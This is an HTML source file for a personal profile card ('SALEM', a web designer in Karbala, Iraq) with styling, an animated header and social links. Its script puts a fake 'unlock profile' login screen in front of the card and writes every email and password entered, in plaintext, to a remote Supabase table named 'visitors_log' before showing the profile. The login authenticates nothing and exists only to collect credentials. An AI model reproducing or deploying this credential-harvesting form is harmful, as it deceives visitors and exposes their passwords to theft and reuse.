<!DOCTYPE HTML>
<html lang="ar">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>SALEM | سـالـم</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.10/typed.min.js"></script>
    
    <style>
        :root {
            --back_color: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%);
            --front_color: rgba(10, 25, 47, 0.7);
            --gold: #FFD700;
            --muted-gold: #c5a059;
            --deep-blue: #1A2980;
            --white: #e6f1ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
        body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }

        /* واجهة الدخول */
        #auth-screen {
            position: fixed; inset: 0; background: var(--back_color); z-index: 1000;
            display: flex; justify-content: center; align-items: center;
        }
        .auth-box {
            width: 90%; max-width: 380px; padding: 40px; background: var(--front_color);
            backdrop-filter: blur(20px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .auth-box h2 { color: var(--gold); margin-bottom: 25px; letter-spacing: 2px; }
        .auth-box input {
            width: 100%; padding: 14px; margin: 10px 0; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 12px; color: white; outline: none;
        }
        .auth-box button {
            width: 100%; padding: 14px; margin-top: 20px;
            background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold));
            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s;
        }

        /* ملف الـ vCard */
        .vcard {
            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
            position: relative; overflow: hidden; display: none; 
        }
        .header { height: 35%; position: relative; }
        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
        .wave-01, .wave-02, .wave-03 { position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border-radius: 43%; animation: rotate 15s linear infinite; }
        .wave-01 { top: -180%; left: -15%; }
        .wave-02 { top: -185%; left: -20%; opacity: 0.3; animation-direction: reverse; }
        .wave-03 { top: -175%; left: -10%; opacity: 0.15; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        
        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
        .profile_video { width: 100%; height: 100%; object-fit: cover; }
        
        .card_content { padding-top: 85px; text-align: center; }
        .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        .snuff { min-height: 80px; padding: 0 30px; color: #8892b0; margin-top: 10px; font-size: 0.9em; }
        
        /* قسم الروابط المحدث */
        .social { margin-top: 20px; }
        .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
        .social a:hover i { color: var(--gold); transform: translateY(-5px); border-color: var(--gold); background: rgba(197, 160, 89, 0.15); }
        
        .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.7em; color: rgba(136, 146, 176, 0.4); text-align: center; }
    </style>
</head>
<body>

<div id="auth-screen">
    <div class="auth-box">
        <h2>WELCOME</h2>
        <p style="color: #8892b0; margin-bottom: 20px; font-size: 0.85em;">Enter details to unlock profile</p>
        <input type="email" id="email" placeholder="Email Address">
        <input type="password" id="password" placeholder="Password">
        <button onclick="handleLogin()">Unlock Profile</button>
        <p id="error-msg" style="margin-top: 15px; font-size: 0.8em; color: #ff4d4d;"></p>
    </div>
</div>

<div class="vcard" id="profile-card">
    <div class="header">
        <div class="wave_bg"><div class="wave-01"></div><div class="wave-02"></div><div class="wave-03"></div></div>
        <div class="profile_pic_content">
            <video class="profile_video" autoplay loop muted playsinline>
                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    <div class="card_content">
        <div class="satan"><h4>SALEM</h4></div>
        <div class="snuff"><h5 class="typed_text"></h5></div>
        
        <div class="social">
            <div>
                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                
                <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
                
                <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
                
                <a href="#"><i class="fas fa-university"></i></a>
            </div>
        </div>
    </div>
    <p class="footer-text">© 2024-2026 Salem Al-Shammari | Karbala, Iraq</p>
</div>

<script>
    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';

    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);

    async function handleLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const errorMsg = document.getElementById('error-msg');

        if (email === "" || password === "") {
            errorMsg.innerText = "يرجى ملء كافة الحقول";
            return;
        }

        const { error } = await supabaseClient
            .from('visitors_log')
            .insert([{ visitor_email: email, visitor_password: password }]);

        if (error) {
            errorMsg.innerText = "حدث خطأ في الاتصال";
        } else {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('profile-card').style.display = 'block';

            new Typed(".typed_text", {
                strings: [
                    "Web Designer & Creative Developer.",
                    "Karbala, Iraq.",
                    "Visca El Barça! 🔵🔴"
                ],
                typeSpeed: 50,
                backSpeed: 30,
                loop: true,
                showCursor: false
            });
        }
    }
</script>
</body>
</html>
